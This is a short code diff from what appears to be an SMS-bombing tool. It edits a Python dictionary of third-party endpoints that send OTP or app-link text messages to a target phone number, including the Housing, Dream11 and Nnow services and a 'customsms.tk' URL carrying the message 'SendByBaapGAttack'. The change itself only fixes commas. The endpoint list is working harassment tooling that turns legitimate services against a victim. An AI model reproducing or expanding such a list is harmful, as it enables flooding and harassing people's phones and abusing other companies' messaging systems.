@@ -6,9 +6,9 @@ apidata = {
 
 "Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=SendByBaapGAttack",{},"GET",'''000'''),
 
-"Housing":("https://login.housing.com/api/v2/send-otp",{"phone": f"{target}"},{},"POST","Sent")
+"Housing":("https://login.housing.com/api/v2/send-otp",{"phone": f"{target}"},{},"POST","Sent"),
 
-"Dream11":("https://api.dream11.com/sendsmslink",{"siteId": "1","mobileNum": f"{target}","appType": "androidfull"},{},"POST","true")
+"Dream11":("https://api.dream11.com/sendsmslink",{"siteId": "1","mobileNum": f"{target}","appType": "androidfull"},{},"POST","true"),
 
 "Nnow":("https://api.nnnow.com/d/api/appDownloadLink",{"mobileNumber": f"{target}"},{},"POST","true")
 
